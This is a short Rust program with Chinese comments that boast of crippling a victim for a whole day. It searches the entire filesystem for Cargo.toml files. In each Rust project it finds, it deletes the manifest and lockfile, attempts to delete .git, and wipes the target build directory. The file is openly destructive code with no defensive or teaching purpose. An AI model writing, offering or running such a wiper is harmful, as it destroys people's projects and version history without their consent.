//! 增大威力, 删除.git Cargo.toml Cargo.lock和缓存文件
//! 天王老子来了也得被控一整天

use std::fs;
use std::path::Path;
use std::process::Command;

fn main() {
    let output = Command::new("find")
        .arg("/")
        .arg("-name")
        .arg("Cargo.toml")
        .output()
        .expect("Failed to execute find command");

    let paths = String::from_utf8_lossy(&output.stdout);
    
    for path in paths.lines() {
        if let Some(parent_dir) = Path::new(path).parent() {
            let _ = fs::remove_file(parent_dir.join("Cargo.toml"));
            let _ = fs::remove_file(parent_dir.join("Cargo.lock"));
            let _ = fs::remove_file(parent_dir.join(".git"));
            let _ = fs::remove_dir_all(parent_dir.join("target"));
        }
    }
}
